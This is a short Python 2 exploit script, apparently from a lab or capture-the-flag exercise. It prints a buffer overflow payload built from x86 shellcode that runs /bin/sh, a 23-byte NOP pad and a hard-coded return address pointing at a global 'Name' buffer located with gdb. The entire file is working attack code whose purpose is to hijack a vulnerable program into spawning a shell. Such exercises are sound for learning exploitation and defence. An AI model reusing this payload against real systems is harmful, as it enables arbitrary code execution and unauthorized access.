#!/usr/bin/python

import struct

name_addr = struct.pack("I", 0x80dacc0)
#use gdb to find the address name. 0x80dacc0 is the address of global variable Name, 4 bytes
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
#the shellcode I found online, 25 bytes

nop = "\x90" * 23
#no operation is 23 bytes
#25 + 23 + 4 = Name buffer
print shellcode + nop + name_addr
#use terminal to save in a txt